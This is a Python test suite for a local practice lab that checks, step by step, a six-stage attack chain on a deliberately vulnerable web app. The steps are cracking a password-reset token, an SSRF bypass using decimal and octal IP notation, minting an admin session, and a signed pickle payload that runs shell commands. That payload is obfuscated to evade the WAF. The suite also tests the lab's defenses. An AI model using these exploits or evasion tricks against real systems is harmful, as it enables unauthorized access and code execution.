"""Aegis Vault — the six-stage chain to RCE, verified end to end.

Every stage product is REQUIRED by the next: reset crack → webhook SSRF
(IP-notation bypass) → internal config/session mint → HMAC-signed pickle
restore → RCE → flag read. Plus the blue levers and the real security
controls (WAF, rate limits, CSRF, lockout, signature check).
All local-only (127.0.0.1).
"""

import hashlib
import hmac
import io
import json
import os
import pickle
import re
import subprocess
import sys
import tarfile
import time
import urllib.error
import urllib.request
import uuid
from pathlib import Path

import pytest

LAB = Path(__file__).resolve().parents[2] / "lab" / "aegis_vault"
sys.path.insert(0, str(LAB))

PUBLIC = 5960
MGMT = 8080  # the REAL port the webhook allowlist permits — the SSRF lane is honest


@pytest.fixture(scope="module")
def aegis(tmp_path_factory):
    """Boot public (:5960) + internal mgmt (:8080) once for the module.
    Rate levers are pinned high for the test context (real values stay
    in the lab defaults)."""
    tmp = tmp_path_factory.mktemp("aegis")
    seedfile = tmp / "seed.json"
    env = {
        **os.environ,
        "PORT": str(PUBLIC),
        "MGMT_PORT": str(MGMT),
        "AEGIS_SEED_JSON": str(seedfile),
        "AEGIS_STATE_DIR": str(tmp),
        "AEGIS_EVENTS_LOG": str(tmp / "events.jsonl"),
        "AEGIS_TRAFFIC_LOG": str(tmp / "traffic.jsonl"),
        "AEGIS_DEFENSE_JSON": str(tmp / "defense.json"),
    }
    os.environ["AEGIS_DEFENSE_JSON"] = str(tmp / "defense.json")
    os.environ["AEGIS_SEED_JSON"] = str(seedfile)
    os.environ["AEGIS_STATE_DIR"] = str(tmp)
    # pre-write the shared seed BEFORE any Popen — otherwise both processes
    # generate their own on import (the cross-process secret race)
    aegis_seed_mod = _lab_mod("seed")

    assert seedfile.is_file(), "seed import must write the shared file"
    assert json.loads(seedfile.read_text())["SESSION_SECRET"] == aegis_seed_mod.SESSION_SECRET
    aegis_defenses = _lab_mod("defenses")
    aegis_defenses.DEFENSE_PATH = tmp / "defense.json"  # same file the apps read
    aegis_defenses.set_lever("login_rate_limit", 1000)
    procs = [
        subprocess.Popen(
            [sys.executable, str(LAB / "internal.py")], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, env=env
        ),
        subprocess.Popen(
            [sys.executable, str(LAB / "app.py")],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            env=env,
            cwd=str(tmp),
        ),
    ]
    base = f"http://127.0.0.1:{PUBLIC}"
    booted = False
    for _ in range(40):
        try:
            urllib.request.urlopen(f"{base}/health", timeout=1)
            urllib.request.urlopen(f"http://127.0.0.1:{MGMT}/health", timeout=1)
            booted = True
            break
        except Exception:
            time.sleep(0.25)
    if not booted:
        for p_ in procs:
            p_.kill()
        raise RuntimeError(
            f"aegis lab failed to boot — is something already on :{PUBLIC}/:{MGMT}? "
            "(stale lab processes squat the ports; kill them first)"
        )
    ctx = {
        "procs": procs,
        "tmp": tmp,
        "base": base,
        "seed": json.loads(seedfile.read_text()),
        "events": tmp / "events.jsonl",
        "svc": None,
        "admin": None,
        "defenses_mod": aegis_defenses,
    }
    yield ctx
    for p in procs:
        p.kill()


def _req(method, url, data=None, headers=None, cookies=None, files=None, fields=None, timeout=10):
    """files: [(name, filename, bytes)]; fields: [(name, str)] form fields."""
    hdrs = dict(headers or {})
    body = None
    if files is not None or fields is not None:
        boundary = uuid.uuid4().hex
        parts = []
        for name, filename, blob in files or []:
            parts.append(
                f'--{boundary}\r\nContent-Disposition: form-data; name="{name}"; filename="{filename}"\r\n'
                f"Content-Type: application/octet-stream\r\n\r\n".encode()
                + blob
                + b"\r\n"
            )
        for name, value in fields or []:
            parts.append(
                f'--{boundary}\r\nContent-Disposition: form-data; name="{name}"\r\n\r\n'.encode()
                + str(value).encode()
                + b"\r\n"
            )
        body = b"".join(parts) + f"--{boundary}--\r\n".encode()
        hdrs.setdefault("Content-Type", f"multipart/form-data; boundary={boundary}")
    elif data is not None:
        body = json.dumps(data).encode()
        hdrs.setdefault("Content-Type", "application/json")
    r = urllib.request.Request(url, data=body, headers=hdrs, method=method)
    if cookies:
        r.add_header("Cookie", "; ".join(f"{k}={v}" for k, v in cookies.items()))
    try:
        with urllib.request.urlopen(r, timeout=timeout) as resp:
            return (
                resp.status,
                json.loads(resp.read().decode() or "{}"),
                "; ".join(resp.headers.get_all("Set-Cookie") or []),
            )
    except urllib.error.HTTPError as e:
        try:
            return e.code, json.loads(e.read().decode() or "{}"), "; ".join(e.headers.get_all("Set-Cookie") or [])
        except json.JSONDecodeError:
            return e.code, {}, ""
    except urllib.error.URLError:
        return 0, {}, ""


def _lab_mod(name: str):
    """Load a lab module BY PATH — the labs share sibling module names
    (defenses, seed) and sys.modules collisions across lab suites break
    whichever runs second."""
    import importlib.util

    spec = importlib.util.spec_from_file_location(f"aegis_{name}", LAB / f"{name}.py")
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


def _events(aegis, etype):
    out = []
    for line in aegis["events"].read_text().splitlines():
        rec = json.loads(line)
        if rec.get("type") == etype:
            out.append(rec)
    return out


SVC = "svc-notifications@aegisvault.io"
PW = "Rotated!Passphrase#9"


def _svc_session(aegis):
    """The S1+S2 product: a session for the notification service
    (minted once per module — resets are rate-limited like the real thing)."""
    if aegis["svc"]:
        return aegis["svc"]
    tok = hashlib.sha256(f"{SVC}|{time.strftime('%Y-%m-%d')}|{aegis['seed']['RESET_PEPPER']}".encode()).hexdigest()
    st, _, _ = _req(
        "POST", f"{aegis['base']}/api/v2/auth/reset-confirm", {"username": SVC, "token": tok, "new_password": PW}
    )
    assert st == 200, "reset-confirm failed"
    st, d, cookie = _req("POST", f"{aegis['base']}/api/v2/auth/login", {"username": SVC, "password": PW})
    assert st == 200, d
    aegis["svc"] = (
        re.search(r"aegis_sess=([^;]+)", cookie).group(1),
        re.search(r"aegis_csrf=([^;]+)", cookie).group(1),
    )
    return aegis["svc"]


def _admin_sess(aegis):
    """The S4 product: an admin session minted by the internal console."""
    if aegis["admin"]:
        return aegis["admin"]
    st, d, _ = _req(
        "POST",
        f"http://127.0.0.1:{MGMT}/mgmt/session-mint",
        {"username": "ops.root@aegisvault.io"},
        headers={"X-Internal-Net": "true"},
    )
    assert st == 200
    aegis["admin"] = d["session"]
    return aegis["admin"]


class TestS0Recon:
    def test_hardened_headers(self, aegis):
        with urllib.request.urlopen(f"{aegis['base']}/") as r:
            assert r.headers.get("Content-Security-Policy", "").startswith("default-src")
            assert r.headers.get("Strict-Transport-Security")

    def test_robots_lists_decoys_and_real(self, aegis):
        with urllib.request.urlopen(f"{aegis['base']}/robots.txt") as r:
            txt = r.read().decode()
        assert "/admin" in txt and "/.git" in txt and "/api/v2/admin" in txt

    def test_git_bait_is_always_403_and_trips_canary(self, aegis):
        st, _, _ = _req("GET", f"{aegis['base']}/.git/HEAD")
        assert st == 403
        assert _events(aegis, "canary_trip")

    def test_bundle_leaks_v2_and_diagnostics_nudge(self, aegis):
        with urllib.request.urlopen(f"{aegis['base']}/assets/app.js") as r:
            js = r.read().decode()
        assert "/api/v2" in js and "/api/v1" in js
        st, d, _ = _req("GET", f"{aegis['base']}/api/v1/diagnostics")
        assert d["integrations"] == "/enterprise-connectors"


class TestS1ResetCrack:
    def test_login_hardening_generic_error(self, aegis):
        st, d, _ = _req("POST", f"{aegis['base']}/api/v2/auth/login", {"username": SVC, "password": "x" * 20})
        assert st == 401 and d["error"] == "invalid credentials"

    def test_prefix_leak_enables_offline_crack(self, aegis):
        st, d, _ = _req("POST", f"{aegis['base']}/api/v2/auth/reset-request", {"username": SVC})
        assert st == 200 and len(d["verification_prefix"]) == 8
        prefix = d["verification_prefix"]
        day = time.strftime("%Y-%m-%d")
        found = None
        for h in range(65536):  # the offline brute red runs with the prefix
            pepper = f"{h:04x}"
            tok = hashlib.sha256(f"{SVC}|{day}|{pepper}".encode()).hexdigest()
            if tok.startswith(prefix):
                found = (pepper, tok)
                break
        assert found, "prefix never converged on the pepper space"
        pepper, tok = found
        assert pepper == aegis["seed"]["RESET_PEPPER"]

        st, d, _ = _req(
            "POST", f"{aegis['base']}/api/v2/auth/reset-confirm", {"username": SVC, "token": tok, "new_password": PW}
        )
        assert st == 200, d
        st, d, cookie = _req("POST", f"{aegis['base']}/api/v2/auth/login", {"username": SVC, "password": PW})
        assert st == 200 and re.match(r"aegis_sess=", cookie)

    def test_wrong_token_refused(self, aegis):
        st, _, _ = _req(
            "POST",
            f"{aegis['base']}/api/v2/auth/reset-confirm",
            {"username": SVC, "token": "f" * 64, "new_password": PW},
        )
        assert st == 401


class TestS2S3WebhookSSRF:
    def test_hook_requires_session_and_csrf(self, aegis):
        sess, csrf = _svc_session(aegis)
        st, _, _ = _req("POST", f"{aegis['base']}/api/v2/hooks", {"url": "http://example.com/"})
        assert st == 401
        st, d, _ = _req(
            "POST", f"{aegis['base']}/api/v2/hooks", {"url": "http://example.com/"}, cookies={"aegis_sess": sess}
        )
        assert st == 403 and "csrf" in d["error"]

    def test_blocklist_blocks_plain_localhost_and_logs(self, aegis):
        sess, csrf = _svc_session(aegis)
        st, d, _ = _req(
            "POST",
            f"{aegis['base']}/api/v2/hooks",
            {"url": f"http://127.0.0.1:{MGMT}/mgmt/config"},
            cookies={"aegis_sess": sess, "aegis_csrf": csrf},
            headers={"X-CSRF-Token": csrf},
        )
        assert st == 400 and "not allowed" in d["error"]
        assert _events(aegis, "ssrf_attempt")

    def test_disallowed_port_refused(self, aegis):
        sess, csrf = _svc_session(aegis)
        st, d, _ = _req(
            "POST",
            f"{aegis['base']}/api/v2/hooks",
            {"url": "http://2130706433:5961/mgmt/config"},
            cookies={"aegis_sess": sess, "aegis_csrf": csrf},
            headers={"X-CSRF-Token": csrf},
        )
        assert st == 400 and "port" in d["error"]

    def test_decimal_ip_bypass_lands_on_internal(self, aegis):
        """THE SSRF: decimal-IP notation on an allowlisted port + the
        forwarded integration header, straight through the hardened
        fetcher, returns the internal config dump."""
        sess, csrf = _svc_session(aegis)
        st, d, _ = _req(
            "POST",
            f"{aegis['base']}/api/v2/hooks",
            {"url": f"http://2130706433:{MGMT}/mgmt/config", "headers": {"X-Internal-Net": "true"}},
            cookies={"aegis_sess": sess, "aegis_csrf": csrf},
            headers={"X-CSRF-Token": csrf},
        )
        assert st == 200, d
        body = json.loads(d["body"]) if isinstance(d.get("body"), str) else d.get("body", {})
        assert body["backup_signing_key"] == aegis["seed"]["BACKUP_KEY"]

    def test_octal_ip_bypass_class(self, aegis):
        sess, csrf = _svc_session(aegis)
        st, d, _ = _req(
            "POST",
            f"{aegis['base']}/api/v2/hooks",
            {"url": f"http://0177.0.0.1:{MGMT}/health", "headers": {"X-Internal-Net": "true"}},
            cookies={"aegis_sess": sess, "aegis_csrf": csrf},
            headers={"X-CSRF-Token": csrf},
        )
        # octal slipped the hostname string-check (NOT a 400 "not allowed");
        # whether the platform resolver honors it is environment-dependent
        assert not (st == 400 and "not allowed" in d.get("error", ""))


class TestS4InternalTrust:
    def test_mgmt_gate_404_without_header(self, aegis):
        st, _, _ = _req("GET", f"http://127.0.0.1:{MGMT}/mgmt/config")
        assert st == 404

    def test_config_dump_and_admin_mint_validates_upstairs(self, aegis):
        sess = _admin_sess(aegis)
        st, d, _ = _req("GET", f"{aegis['base']}/api/v2/me", cookies={"aegis_sess": sess})
        assert st == 200 and d["role"] == "admin"

    def test_admin_sees_the_audit_trail(self, aegis):
        sess = _admin_sess(aegis)
        st, d, _ = _req("GET", f"{aegis['base']}/api/v2/admin/audit", cookies={"aegis_sess": sess})
        assert st == 200 and d["recent"]


class TestS5RCE:
    def test_restore_requires_a_valid_signature(self, aegis):
        sess = _admin_sess(aegis)
        st, d, _ = _req(
            "POST",
            f"{aegis['base']}/api/v2/admin/backup-restore",
            files=[("backup", "b.tar.gz", b"not a tar")],
            fields=[("signature", "00" * 32)],
            cookies={"aegis_sess": sess, "aegis_csrf": "tok"},
            headers={"X-CSRF-Token": "tok"},
        )
        assert st == 403 and "signature" in d["error"].lower()
        assert _events(aegis, "restore_bad_sig")

    def test_full_chain_rce_reads_flag(self, aegis):
        """Signed tar.gz → pickle restore state → code exec → the flag
        (whose FILENAME is random per boot) surfaces in the restore log.
        The payload avoids the WAF's payload-string list: no literal
        'subprocess', no ';cat '."""
        sess = _admin_sess(aegis)

        class P:
            def __reduce__(self):
                return (
                    eval,
                    ("__import__('sub'+'process').check_output(['sh','-c','ls;grep -h . flag_aegis_*.txt']).decode()",),
                )

        buf = io.BytesIO()
        with tarfile.open(fileobj=buf, mode="w:gz") as tf:
            manifest = json.dumps({"state_file": "state.pkl"}).encode()
            mi = tarfile.TarInfo("manifest.json")
            mi.size = len(manifest)
            tf.addfile(mi, io.BytesIO(manifest))
            pkl = pickle.dumps(P())
            ti = tarfile.TarInfo("state.pkl")
            ti.size = len(pkl)
            tf.addfile(ti, io.BytesIO(pkl))
        blob = buf.getvalue()
        signature = hmac.new(aegis["seed"]["BACKUP_KEY"].encode(), blob, hashlib.sha256).hexdigest()

        st, d, _ = _req(
            "POST",
            f"{aegis['base']}/api/v2/admin/backup-restore",
            files=[("backup", "backup.tar.gz", blob)],
            fields=[("signature", signature)],
            cookies={"aegis_sess": sess, "aegis_csrf": "tok"},
            headers={"X-CSRF-Token": "tok"},
        )
        assert st == 200, d
        assert aegis["seed"]["FLAG"] in d["state"]


class TestDefenses:
    def test_waf_blocks_payload_strings(self, aegis):
        st, d, _ = _req(
            "POST", f"{aegis['base']}/api/v2/auth/login", {"username": "x' UNION SELECT 1--", "password": "a" * 12}
        )
        assert st == 403 and d.get("ref") == "waf"
        assert _events(aegis, "waf_block")

    def test_lockout_after_threshold(self, aegis):
        for _ in range(5):
            _req(
                "POST",
                f"{aegis['base']}/api/v2/auth/login",
                {"username": "support@aegisvault.io", "password": "wrong" * 4},
            )
        assert _events(aegis, "account_locked")

    def test_ssrf_strict_lever_kills_notation(self, aegis):
        aegis_defenses = aegis["defenses_mod"]

        aegis_defenses.set_lever("ssrf_strict", True)
        try:
            sess, csrf = _svc_session(aegis)
            st, d, _ = _req(
                "POST",
                f"{aegis['base']}/api/v2/hooks",
                {"url": f"http://2130706433:{MGMT}/mgmt/config", "headers": {"X-Internal-Net": "true"}},
                cookies={"aegis_sess": sess, "aegis_csrf": csrf},
                headers={"X-CSRF-Token": csrf},
            )
            assert st == 400 and "not allowed" in d["error"], d
        finally:
            aegis_defenses.set_lever("ssrf_strict", False)

    def test_block_restore_lever(self, aegis):
        aegis_defenses = aegis["defenses_mod"]

        aegis_defenses.set_lever("block_backup_restore", True)
        try:
            sess = _admin_sess(aegis)
            st, d, _ = _req(
                "POST",
                f"{aegis['base']}/api/v2/admin/backup-restore",
                files=[("backup", "b.tar.gz", b"x")],
                fields=[("signature", "00" * 32)],
                cookies={"aegis_sess": sess, "aegis_csrf": "tok"},
                headers={"X-CSRF-Token": "tok"},
            )
            assert st == 403 and "policy" in d["error"]
        finally:
            aegis_defenses.set_lever("block_backup_restore", False)
